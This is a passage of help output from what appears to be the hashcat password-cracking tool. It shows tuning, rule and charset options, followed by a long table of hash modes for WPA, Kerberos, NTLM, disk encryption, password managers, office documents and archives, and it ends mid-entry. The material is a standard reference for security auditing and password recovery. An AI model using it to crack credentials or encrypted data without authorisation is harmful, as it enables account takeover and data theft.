-u, --kernel-loops | Num | Manual workload tuning, set innerloop step size to X | -u 256 -T, --kernel-threads | Num | Manual workload tuning, set thread count to X | -T 64 --backend-vector-width | Num | Manually override backend vector-width to X | --backend-vector=4 --spin-damp | Num | Use CPU for device synchronization, in percent | --spin-damp=10 --hwmon-disable | | Disable temperature and fanspeed reads and triggers | --hwmon-temp-abort | Num | Abort if temperature reaches X degrees Celsius | --hwmon-temp-abort=100 --scrypt-tmto | Num | Manually override TMTO value for scrypt to X | --scrypt-tmto=3 -s, --skip | Num | Skip X words from the start | -s 1000000 -l, --limit | Num | Limit X words from the start + skipped words | -l 1000000 --keyspace | | Show keyspace base:mod values and quit | -j, --rule-left | Rule | Single rule applied to each word from left wordlist | -j 'c' -k, --rule-right | Rule | Single rule applied to each word from right wordlist | -k '^-' -r, --rules-file | File | Multiple rules applied to each word from wordlists | -r rules/best64.rule -g, --generate-rules | Num | Generate X random rules | -g 10000 --generate-rules-func-min | Num | Force min X functions per rule | --generate-rules-func-max | Num | Force max X functions per rule | --generate-rules-func-sel | Str | Pool of rule operators valid for random rule engine | --generate-rules-func-sel=ioTlc --generate-rules-seed | Num | Force RNG seed set to X | -1, --custom-charset1 | CS | User-defined charset ?1 | -1 ?l?d?u -2, --custom-charset2 | CS | User-defined charset ?2 | -2 ?l?d?s -3, --custom-charset3 | CS | User-defined charset ?3 | -4, --custom-charset4 | CS | User-defined charset ?4 | --identify | | Shows all supported algorithms for input hashes | --identify my.hash -i, --increment | | Enable mask increment mode | --increment-min | Num | Start mask incrementing at X | --increment-min=4 --increment-max | Num | Stop mask incrementing at X | --increment-max=8 -S, --slow-candidates | | Enable slower (but advanced) candidate generators | --brain-server | | Enable brain server | --brain-server-timer | Num | Update the brain server dump each X seconds (min:60) | --brain-server-timer=300 -z, --brain-client | | Enable brain client, activates -S | --brain-client-features | Num | Define brain client features, see below | --brain-client-features=3 --brain-host | Str | Brain server host (IP or domain) | --brain-host=127.0.0.1 --brain-port | Port | Brain server port | --brain-port=13743 --brain-password | Str | Brain server authentication password | --brain-password=bZfhCvGUSjRq --brain-session | Hex | Overrides automatically calculated brain session | --brain-session=0x2ae611db --brain-session-whitelist | Hex | Allow given sessions only, separated with commas | --brain-session-whitelist=0x2ae611db- [ Hash modes ] - # | Name | Category ======+============================================================+====================================== 900 | MD4 | Raw Hash 0 | MD5 | Raw Hash 100 | SHA1 | Raw Hash 1300 | SHA2-224 | Raw Hash 1400 | SHA2-256 | Raw Hash 10800 | SHA2-384 | Raw Hash 1700 | SHA2-512 | Raw Hash 17300 | SHA3-224 | Raw Hash 17400 | SHA3-256 | Raw Hash 17500 | SHA3-384 | Raw Hash 17600 | SHA3-512 | Raw Hash 6000 | RIPEMD-160 | Raw Hash 600 | BLAKE2b-512 | Raw Hash 11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash 11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash 6900 | GOST R 34.11-94 | Raw Hash 17010 | GPG (AES-128/AES-256 (SHA-1($pass))) | Raw Hash 5100 | Half MD5 | Raw Hash 17700 | Keccak-224 | Raw Hash 17800 | Keccak-256 | Raw Hash 17900 | Keccak-384 | Raw Hash 18000 | Keccak-512 | Raw Hash 6100 | Whirlpool | Raw Hash 10100 | SipHash | Raw Hash 70 | md5(utf16le($pass)) | Raw Hash 170 | sha1(utf16le($pass)) | Raw Hash 1470 | sha256(utf16le($pass)) | Raw Hash 10870 | sha384(utf16le($pass)) | Raw Hash 1770 | sha512(utf16le($pass)) | Raw Hash 610 | BLAKE2b-512($pass.$salt) | Raw Hash salted and/or iterated 620 | BLAKE2b-512($salt.$pass) | Raw Hash salted and/or iterated 10 | md5($pass.$salt) | Raw Hash salted and/or iterated 20 | md5($salt.$pass) | Raw Hash salted and/or iterated 3800 | md5($salt.$pass.$salt) | Raw Hash salted and/or iterated 3710 | md5($salt.md5($pass)) | Raw Hash salted and/or iterated 4110 | md5($salt.md5($pass.$salt)) | Raw Hash salted and/or iterated 4010 | md5($salt.md5($salt.$pass)) | Raw Hash salted and/or iterated 21300 | md5($salt.sha1($salt.$pass)) | Raw Hash salted and/or iterated 40 | md5($salt.utf16le($pass)) | Raw Hash salted and/or iterated 2600 | md5(md5($pass)) | Raw Hash salted and/or iterated 3910 | md5(md5($pass).md5($salt)) | Raw Hash salted and/or iterated 3500 | md5(md5(md5($pass))) | Raw Hash salted and/or iterated 4400 | md5(sha1($pass)) | Raw Hash salted and/or iterated 4410 | md5(sha1($pass).$salt) | Raw Hash salted and/or iterated 20900 | md5(sha1($pass).md5($pass).sha1($pass)) | Raw Hash salted and/or iterated 21200 | md5(sha1($salt).md5($pass)) | Raw Hash salted and/or iterated 4300 | md5(strtoupper(md5($pass))) | Raw Hash salted and/or iterated 30 | md5(utf16le($pass).$salt) | Raw Hash salted and/or iterated 110 | sha1($pass.$salt) | Raw Hash salted and/or iterated 120 | sha1($salt.$pass) | Raw Hash salted and/or iterated 4900 | sha1($salt.$pass.$salt) | Raw Hash salted and/or iterated 4520 | sha1($salt.sha1($pass)) | Raw Hash salted and/or iterated 24300 | sha1($salt.sha1($pass.$salt)) | Raw Hash salted and/or iterated 140 | sha1($salt.utf16le($pass)) | Raw Hash salted and/or iterated 19300 | sha1($salt1.$pass.$salt2) | Raw Hash salted and/or iterated 14400 | sha1(CX) | Raw Hash salted and/or iterated 4700 | sha1(md5($pass)) | Raw Hash salted and/or iterated 4710 | sha1(md5($pass).$salt) | Raw Hash salted and/or iterated 21100 | sha1(md5($pass.$salt)) | Raw Hash salted and/or iterated 18500 | sha1(md5(md5($pass))) | Raw Hash salted and/or iterated 4500 | sha1(sha1($pass)) | Raw Hash salted and/or iterated 4510 | sha1(sha1($pass).$salt) | Raw Hash salted and/or iterated 5000 | sha1(sha1($salt.$pass.$salt)) | Raw Hash salted and/or iterated 130 | sha1(utf16le($pass).$salt) | Raw Hash salted and/or iterated 1410 | sha256($pass.$salt) | Raw Hash salted and/or iterated 1420 | sha256($salt.$pass) | Raw Hash salted and/or iterated 22300 | sha256($salt.$pass.$salt) | Raw Hash salted and/or iterated 20720 | sha256($salt.sha256($pass)) | Raw Hash salted and/or iterated 21420 | sha256($salt.sha256_bin($pass)) | Raw Hash salted and/or iterated 1440 | sha256($salt.utf16le($pass)) | Raw Hash salted and/or iterated 20800 | sha256(md5($pass)) | Raw Hash salted and/or iterated 20710 | sha256(sha256($pass).$salt) | Raw Hash salted and/or iterated 21400 | sha256(sha256_bin($pass)) | Raw Hash salted and/or iterated 1430 | sha256(utf16le($pass).$salt) | Raw Hash salted and/or iterated 10810 | sha384($pass.$salt) | Raw Hash salted and/or iterated 10820 | sha384($salt.$pass) | Raw Hash salted and/or iterated 10840 | sha384($salt.utf16le($pass)) | Raw Hash salted and/or iterated 10830 | sha384(utf16le($pass).$salt) | Raw Hash salted and/or iterated 1710 | sha512($pass.$salt) | Raw Hash salted and/or iterated 1720 | sha512($salt.$pass) | Raw Hash salted and/or iterated 1740 | sha512($salt.utf16le($pass)) | Raw Hash salted and/or iterated 1730 | sha512(utf16le($pass).$salt) | Raw Hash salted and/or iterated 50 | HMAC-MD5 (key = $pass) | Raw Hash authenticated 60 | HMAC-MD5 (key = $salt) | Raw Hash authenticated 150 | HMAC-SHA1 (key = $pass) | Raw Hash authenticated 160 | HMAC-SHA1 (key = $salt) | Raw Hash authenticated 1450 | HMAC-SHA256 (key = $pass) | Raw Hash authenticated 1460 | HMAC-SHA256 (key = $salt) | Raw Hash authenticated 1750 | HMAC-SHA512 (key = $pass) | Raw Hash authenticated 1760 | HMAC-SHA512 (key = $salt) | Raw Hash authenticated 11750 | HMAC-Streebog-256 (key = $pass), big-endian | Raw Hash authenticated 11760 | HMAC-Streebog-256 (key = $salt), big-endian | Raw Hash authenticated 11850 | HMAC-Streebog-512 (key = $pass), big-endian | Raw Hash authenticated 11860 | HMAC-Streebog-512 (key = $salt), big-endian | Raw Hash authenticated 28700 | Amazon AWS4-HMAC-SHA256 | Raw Hash authenticated 11500 | CRC32 | Raw Checksum 27900 | CRC32C | Raw Checksum 28000 | CRC64Jones | Raw Checksum 18700 | Java Object hashCode() | Raw Checksum 25700 | MurmurHash | Raw Checksum 27800 | MurmurHash3 | Raw Checksum 14100 | 3DES (PT = $salt, key = $pass) | Raw Cipher, Known-plaintext attack 14000 | DES (PT = $salt, key = $pass) | Raw Cipher, Known-plaintext attack 26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass) | Raw Cipher, Known-plaintext attack 26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass) | Raw Cipher, Known-plaintext attack 26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass) | Raw Cipher, Known-plaintext attack 15400 | ChaCha20 | Raw Cipher, Known-plaintext attack 14500 | Linux Kernel Crypto API (2.4) | Raw Cipher, Known-plaintext attack 14900 | Skip32 (PT = $salt, key = $pass) | Raw Cipher, Known-plaintext attack 11900 | PBKDF2-HMAC-MD5 | Generic KDF 12000 | PBKDF2-HMAC-SHA1 | Generic KDF 10900 | PBKDF2-HMAC-SHA256 | Generic KDF 12100 | PBKDF2-HMAC-SHA512 | Generic KDF 8900 | scrypt | Generic KDF 400 | phpass | Generic KDF 16100 | TACACS+ | Network Protocol 11400 | SIP digest authentication (MD5) | Network Protocol 5300 | IKE-PSK MD5 | Network Protocol 5400 | IKE-PSK SHA1 | Network Protocol 25100 | SNMPv3 HMAC-MD5-96 | Network Protocol 25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96 | Network Protocol 25200 | SNMPv3 HMAC-SHA1-96 | Network Protocol 26700 | SNMPv3 HMAC-SHA224-128 | Network Protocol 26800 | SNMPv3 HMAC-SHA256-192 | Network Protocol 26900 | SNMPv3 HMAC-SHA384-256 | Network Protocol 27300 | SNMPv3 HMAC-SHA512-384 | Network Protocol 2500 | WPA-EAPOL-PBKDF2 | Network Protocol 2501 | WPA-EAPOL-PMK | Network Protocol 22000 | WPA-PBKDF2-PMKID+EAPOL | Network Protocol 22001 | WPA-PMK-PMKID+EAPOL | Network Protocol 16800 | WPA-PMKID-PBKDF2 | Network Protocol 16801 | WPA-PMKID-PMK | Network Protocol 7300 | IPMI2 RAKP HMAC-SHA1 | Network Protocol 10200 | CRAM-MD5 | Network Protocol 16500 | JWT (JSON Web Token) | Network Protocol 29200 | Radmin3 | Network Protocol 19600 | Kerberos 5, etype 17, TGS-REP | Network Protocol 19800 | Kerberos 5, etype 17, Pre-Auth | Network Protocol 28800 | Kerberos 5, etype 17, DB | Network Protocol 19700 | Kerberos 5, etype 18, TGS-REP | Network Protocol 19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol 28900 | Kerberos 5, etype 18, DB | Network Protocol 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth | Network Protocol 13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol 18200 | Kerberos 5, etype 23, AS-REP | Network Protocol 5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network Protocol 5600 | NetNTLMv2 | Network Protocol 27100 | NetNTLMv2 (NT) | Network Protocol 29100 | Flask Session Cookie ($salt.$salt.$pass) | Network Protocol 4800 | iSCSI CHAP authentication, MD5(CHAP) | Network Protocol 8500 | RACF | Operating System 6300 | AIX {smd5} | Operating System 6700 | AIX {ssha1} | Operating System 6400 | AIX {ssha256} | Operating System 6500 | AIX {ssha512} | Operating System 3000 | LM | Operating System 19000 | QNX /etc/shadow (MD5) | Operating System 19100 | QNX /etc/shadow (SHA256) | Operating System 19200 | QNX /etc/shadow (SHA512) | Operating System 15300 | DPAPI masterkey file v1 (context 1 and 2) | Operating System 15310 | DPAPI masterkey file v1 (context 3) | Operating System 15900 | DPAPI masterkey file v2 (context 1 and 2) | Operating System 15910 | DPAPI masterkey file v2 (context 3) | Operating System 7200 | GRUB 2 | Operating System 12800 | MS-AzureSync PBKDF2-HMAC-SHA256 | Operating System 12400 | BSDi Crypt, Extended DES | Operating System 1000 | NTLM | Operating System 9900 | Radmin2 | Operating System 5800 | Samsung Android Password/PIN | Operating System 28100 | Windows Hello PIN/Password | Operating System 13800 | Windows Phone 8+ PIN/password | Operating System 2410 | Cisco-ASA MD5 | Operating System 9200 | Cisco-IOS $8$ (PBKDF2-SHA256) | Operating System 9300 | Cisco-IOS $9$ (scrypt) | Operating System 5700 | Cisco-IOS type 4 (SHA256) | Operating System 2400 | Cisco-PIX MD5 | Operating System 8100 | Citrix NetScaler (SHA1) | Operating System 22200 | Citrix NetScaler (SHA512) | Operating System 1100 | Domain Cached Credentials (DCC), MS Cache | Operating System 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2 | Operating System 7000 | FortiGate (FortiOS) | Operating System 26300 | FortiGate256 (FortiOS256) | Operating System 125 | ArubaOS | Operating System 501 | Juniper IVE | Operating System 22 | Juniper NetScreen/SSG (ScreenOS) | Operating System 15100 | Juniper/NetBSD sha1crypt | Operating System 26500 | iPhone passcode (UID key + System Keybag) | Operating System 122 | macOS v10.4, macOS v10.5, macOS v10.6 | Operating System 1722 | macOS v10.7 | Operating System 7100 | macOS v10.8+ (PBKDF2-SHA512) | Operating System 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System 1500 | descrypt, DES (Unix), Traditional DES | Operating System 29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass))) | Operating System 7400 | sha256crypt $5$, SHA256 (Unix) | Operating System 1800 | sha512crypt $6$, SHA512 (Unix) | Operating System 24600 | SQLCipher | Database Server 131 | MSSQL (2000) | Database Server 132 | MSSQL (2005) | Database Server 1731 | MSSQL (2012, 2014) | Database Server 24100 | MongoDB ServerKey SCRAM-SHA-1 | Database Server 24200 | MongoDB ServerKey SCRAM-SHA-256 | Database Server 12 | PostgreSQL | Database Server 11100 | PostgreSQL CRAM (MD5) | Database Server 28600 | PostgreSQL SCRAM-SHA-256 | Database Server 3100 | Oracle H: Type (Oracle 7+) | Database Server 112 | Oracle S: Type (Oracle 11+) | Database Server 12300 | Oracle T: Type (Oracle 12+) | Database Server 7401 | MySQL $A$ (sha256crypt) | Database Server 11200 | MySQL CRAM (SHA1) | Database Server 200 | MySQL323 | Database Server 300 | MySQL4.1/MySQL5 | Database Server 8000 | Sybase ASE | Database Server 8300 | DNSSEC (NSEC3) | FTP, HTTP, SMTP, LDAP Server 25900 | KNX IP Secure - Device Authentication Code | FTP, HTTP, SMTP, LDAP Server 16400 | CRAM-MD5 Dovecot | FTP, HTTP, SMTP, LDAP Server 1411 | SSHA-256(Base64), LDAP {SSHA256} | FTP, HTTP, SMTP, LDAP Server 1711 | SSHA-512(Base64), LDAP {SSHA512} | FTP, HTTP, SMTP, LDAP Server 24900 | Dahua Authentication MD5 | FTP, HTTP, SMTP, LDAP Server 10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256) | FTP, HTTP, SMTP, LDAP Server 15000 | FileZilla Server &gt;= 0.9.55 | FTP, HTTP, SMTP, LDAP Server 12600 | ColdFusion 10+ | FTP, HTTP, SMTP, LDAP Server 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server 141 | Episerver 6.x &lt; .NET 4 | FTP, HTTP, SMTP, LDAP Server 1441 | Episerver 6.x &gt;= .NET 4 | FTP, HTTP, SMTP, LDAP Server 1421 | hMailServer | FTP, HTTP, SMTP, LDAP Server 101 | nsldap, SHA-1(Base64), Netscape LDAP SHA | FTP, HTTP, SMTP, LDAP Server 111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA | FTP, HTTP, SMTP, LDAP Server 7700 | SAP CODVN B (BCODE) | Enterprise Application Software (EAS) 7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE | Enterprise Application Software (EAS) 7800 | SAP CODVN F/G (PASSCODE) | Enterprise Application Software (EAS) 7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE | Enterprise Application Software (EAS) 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1 | Enterprise Application Software (EAS) 133 | PeopleSoft | Enterprise Application Software (EAS) 13500 | PeopleSoft PS_TOKEN | Enterprise Application Software (EAS) 21500 | SolarWinds Orion | Enterprise Application Software (EAS) 21501 | SolarWinds Orion v2 | Enterprise Application Software (EAS) 24 | SolarWinds Serv-U | Enterprise Application Software (EAS) 8600 | Lotus Notes/Domino 5 | Enterprise Application Software (EAS) 8700 | Lotus Notes/Domino 6 | Enterprise Application Software (EAS) 9100 | Lotus Notes/Domino 8 | Enterprise Application Software (EAS) 26200 | OpenEdge Progress Encode | Enterprise Application Software (EAS) 20600 | Oracle Transportation Management (SHA256) | Enterprise Application Software (EAS) 4711 | Huawei sha1(md5($pass).$salt) | Enterprise Application Software (EAS) 20711 | AuthMe sha256 | Enterprise Application Software (EAS) 22400 | AES Crypt (SHA256) | Full-Disk Encryption (FDE) 27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC) | Full-Disk Encryption (FDE) 14600 | LUKS v1 (legacy) | Full-Disk Encryption (FDE) 29541 | LUKS v1 RIPEMD-160 + AES | Full-Disk Encryption (FDE) 29542 | LUKS v1 RIPEMD-160 + Serpent | Full-Disk Encryption (FDE) 29543 | LUKS v1 RIPEMD-160 + Twofish | Full-Disk Encryption (FDE) 29511 | LUKS v1 SHA-1 + AES | Full-Disk Encryption (FDE) 29512 | LUKS v1 SHA-1 + Serpent | Full-Disk Encryption (FDE) 29513 | LUKS v1 SHA-1 + Twofish | Full-Disk Encryption (FDE) 29521 | LUKS v1 SHA-256 + AES | Full-Disk Encryption (FDE) 29522 | LUKS v1 SHA-256 + Serpent | Full-Disk Encryption (FDE) 29523 | LUKS v1 SHA-256 + Twofish | Full-Disk Encryption (FDE) 29531 | LUKS v1 SHA-512 + AES | Full-Disk Encryption (FDE) 29532 | LUKS v1 SHA-512 + Serpent | Full-Disk Encryption (FDE) 29533 | LUKS v1 SHA-512 + Twofish | Full-Disk Encryption (FDE) 13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 29411 | VeraCrypt RIPEMD160 + XTS 512 bit | Full-Disk Encryption (FDE) 29412 | VeraCrypt RIPEMD160 + XTS 1024 bit | Full-Disk Encryption (FDE) 29413 | VeraCrypt RIPEMD160 + XTS 1536 bit | Full-Disk Encryption (FDE) 29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode | Full-Disk Encryption (FDE) 29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode | Full-Disk Encryption (FDE) 29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode | Full-Disk Encryption (FDE) 13751 | VeraCrypt SHA256 + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 29451 | VeraCrypt SHA256 + XTS 512 bit | Full-Disk Encryption (FDE) 29452 | VeraCrypt SHA256 + XTS 1024 bit | Full-Disk Encryption (FDE) 29453 | VeraCrypt SHA256 + XTS 1536 bit | Full-Disk Encryption (FDE) 29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode | Full-Disk Encryption (FDE) 29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode | Full-Disk Encryption (FDE) 29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode | Full-Disk Encryption (FDE) 13721 | VeraCrypt SHA512 + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 29421 | VeraCrypt SHA512 + XTS 512 bit | Full-Disk Encryption (FDE) 29422 | VeraCrypt SHA512 + XTS 1024 bit | Full-Disk Encryption (FDE) 29423 | VeraCrypt SHA512 + XTS 1536 bit | Full-Disk Encryption (FDE) 13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 29471 | VeraCrypt Streebog-512 + XTS 512 bit | Full-Disk Encryption (FDE) 29472 | VeraCrypt Streebog-512 + XTS 1024 bit | Full-Disk Encryption (FDE) 29473 | VeraCrypt Streebog-512 + XTS 1536 bit | Full-Disk Encryption (FDE) 29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode | Full-Disk Encryption (FDE) 29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode | Full-Disk Encryption (FDE) 29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode | Full-Disk Encryption (FDE) 13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 29431 | VeraCrypt Whirlpool + XTS 512 bit | Full-Disk Encryption (FDE) 29432 | VeraCrypt Whirlpool + XTS 1024 bit | Full-Disk Encryption (FDE) 29433 | VeraCrypt Whirlpool + XTS 1536 bit | Full-Disk Encryption (FDE) 23900 | BestCrypt v3 Volume Encryption | Full-Disk Encryption (FDE) 16700 | FileVault 2 | Full-Disk Encryption (FDE) 27500 | VirtualBox (PBKDF2-HMAC-SHA256 &amp; AES-128-XTS) | Full-Disk Encryption (FDE) 27600 | VirtualBox (PBKDF2-HMAC-SHA256 &amp; AES-256-XTS) | Full-Disk Encryption (FDE) 20011 | DiskCryptor SHA512 + XTS 512 bit | Full-Disk Encryption (FDE) 20012 | DiskCryptor SHA512 + XTS 1024 bit | Full-Disk Encryption (FDE) 20013 | DiskCryptor SHA512 + XTS 1536 bit | Full-Disk Encryption (FDE) 22100 | BitLocker | Full-Disk Encryption (FDE) 12900 | Android FDE (Samsung DEK) | Full-Disk Encryption (FDE) 8800 | Android FDE &lt;= 4.3 | Full-Disk Encryption (FDE) 18300 | Apple File System (APFS) | Full-Disk Encryption (FDE) 6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE) 29311 | TrueCrypt RIPEMD160 + XTS 512 bit | Full-Disk Encryption (FDE) 29312 | TrueCrypt RIPEMD160 + XTS 1024 bit | Full-Disk Encryption (FDE) 29313 | TrueCrypt RIPEMD160 + XTS 1536 bit | Full-Disk Encryption (FDE) 29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode | Full-Disk Encryption (FDE) 29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode | Full-Disk Encryption (FDE) 29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode | Full-Disk Encryption (FDE) 6221 | TrueCrypt SHA512 + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 29321 | TrueCrypt SHA512 + XTS 512 bit | Full-Disk Encryption (FDE) 29322 | TrueCrypt SHA512 + XTS 1024 bit | Full-Disk Encryption (FDE) 29323 | TrueCrypt SHA512 + XTS 1536 bit | Full-Disk Encryption (FDE) 6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy) | Full-Disk Encryption (FDE) 6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy) | Full-Disk Encryption (FDE) 6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy) | Full-Disk Encryption (FDE) 29331 | TrueCrypt Whirlpool + XTS 512 bit | Full-Disk Encryption (FDE) 29332 | TrueCrypt Whirlpool + XTS 1024 bit | Full-Disk Encryption (FDE) 29333 | TrueCrypt Whirlpool + XTS 1536 bit | Full-Disk Encryption (FDE) 12200 | eCryptfs | Full-Disk Encryption (FDE) 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4) | Document 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1 | Document 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2 | Document 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8) | Document 25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass | Document 10600 | PDF 1.7 Level 3 (Acrobat 9) | Document 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11) | Document 9400 | MS Office 2007 | Document 9500 | MS Office 2010 | Document 9600 | MS Office 2013 | Document 25300 | MS Office 2016 - SheetProtection | Document 9700 | MS Office &lt;= 2003 $0/$1, MD5 + RC4 | Document 9710 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1 | Document 9720 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2 | Document 9810 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1 | Document 9820 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2 | Document 9800 | MS Office &lt;= 2003 $3/$4, SHA1 + RC4 | Document 18400 | Open Document Format (ODF) 1.2 (SHA-256, AES) | Document 18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish) | Document 16200 | Apple Secure Notes | Document 23300 | Apple iWork | Document 6600 | 1Password, agilekeychain | Password Manager 8200 | 1Password, cloudkeychain | Password Manager 9000 | Password Safe v2 | Password Manager 5200 | Password Safe v3 | Password Manager 6800 | LastPass + LastPass sniffed | Password Manager 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager 29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager 23400 | Bitwarden | Password Manager 16900 | Ansible Vault | Password Manager 26000 | Mozilla key3.db | Password Manager 26100 | Mozilla key4.db | Password Manager 23100 | Apple Keychain | Password Manager 11600 | 7-Zip | Archive 12500 | RAR3-hp | Archive 23800 | RAR3-p (Compressed) | Archive 23700 | RAR3-p (Uncompressed) | Archive 13000 | RAR5 | Archive 17220 | PKZIP (Compressed Multi-File) | Archive 17200 | PKZIP (Compressed) | Archive 17225 | PKZIP (Mixed Multi-File) | Archive 17230 | PKZIP (Mixed Multi-File Checksum-Only) | Archive 17210 | PKZIP (Uncompressed) | Archive 20500 | PKZIP Master Key | Archive 20510 | PKZIP Master Key (6 byte optimization) | Archive 23001 | SecureZIP AES-128 | Archive 23002 | SecureZIP AES-192 | Archive 23003 | SecureZIP AES-256 | Archive 13600 | WinZip | Archive 18900 | Android Backup | Archive 24700 | Stuffit5 | Archive 13200 | AxCrypt 1 | Archive 13300 | AxCrypt 1 in-memory SHA1 | Archive 23500 | AxCrypt 2 AES-128 | Archive 23600 | AxCrypt 2 AES-256 | Archive 14700 | iTunes backup &lt; 10.0 | Archive 14800 | iTunes backup &gt;= 10.0 | Archive 8400 | WBB3 (Woltlab Burning Board) | Forums, CMS, E-Commerce 2612 | PHPS | Forums, CMS, E-Commerce 121 | SMF (Simple Machines Forum) &gt; v1.1 | Forums, CMS, E-Commerce 3711 | MediaWiki B type | Forums, CMS, E-Commerce 4521 | Redmine | Forums, CMS, E-Commerce 24800 | Umbraco HMAC-SHA1 | Forums, CMS, E-Commerce 11 | Joomla &lt; 2.5.18 | Forums, CMS, E-Commerce 13900 | OpenCart | Forums, CMS, E-Commerce 11000 | PrestaShop | Forums, CMS, E-Commerce 16000 | Tripcode | Forums, CMS, E-Commerce 7900 | Drupal7 | Forums, CMS, E-Commerce 4522 | PunBB | Forums, CMS, E-Commerce 2811 | MyBB 1.2+, IPB2+ (Invision Power Board) | Forums, CMS, E-Commerce 2611 | vBulletin &lt; v3.8.5 | Forums, CMS, E-Commerce 2711 | 